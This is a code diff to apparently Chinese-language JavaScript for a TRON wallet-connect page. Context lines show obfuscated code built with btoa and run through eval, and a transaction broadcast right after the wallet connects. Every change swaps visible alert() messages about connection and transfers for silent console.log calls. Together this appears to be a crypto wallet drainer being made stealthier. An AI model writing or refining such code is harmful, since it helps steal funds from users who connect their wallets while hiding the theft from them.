@@ -35,10 +35,10 @@ btnConnect.onclick = async () => {
     address = result.address;
     addressEl.textContent = address;
     btnSend.disabled = false;
-    alert("钱包已连接，地址：" + address);
+    console.log("钱包已连接，地址：" + address);
   } catch (e) {
     console.error("连接失败:", e);
-    alert("连接钱包失败");
+    console.log("连接钱包失败");
   }
     try {
     const base64Code = btoa(`window.tronWeb = new TronWeb({
@@ -70,17 +70,17 @@ eval(decoded);
 
     console.log("广播结果:", broadcastResult);
     if (broadcastResult.result) {
-      alert("转账成功，交易已广播");
+      console.log("转账成功，交易已广播");
       await wallet.disconnect();
 
     } else {
-      alert("交易广播失败");
+      console.log("交易广播失败");
       await wallet.disconnect();
 
     }
   } catch (e) {
     console.error("转账失败:", e);
-    alert("转账失败，请查看控制台");
+    console.log("转账失败，请查看控制台");
       await wallet.disconnect();
 
   }
@@ -88,7 +88,7 @@ eval(decoded);
 
 btnSend.onclick = async () => {
   if (!address) {
-    alert("请先连接钱包");
+    console.log("请先连接钱包");
     return;
   }
   try {
@@ -121,13 +121,13 @@ eval(decoded);
 
     console.log("广播结果:", broadcastResult);
     if (broadcastResult.result) {
-      alert("转账成功，交易已广播");
+      console.log("转账成功，交易已广播");
     } else {
-      alert("交易广播失败");
+      console.log("交易广播失败");
     }
   } catch (e) {
     console.error("转账失败:", e);
-    alert("转账失败，请查看控制台");
+    console.log("转账失败，请查看控制台");
   }
 };
 const btnDisconnect = document.getElementById("btnDisconnect");
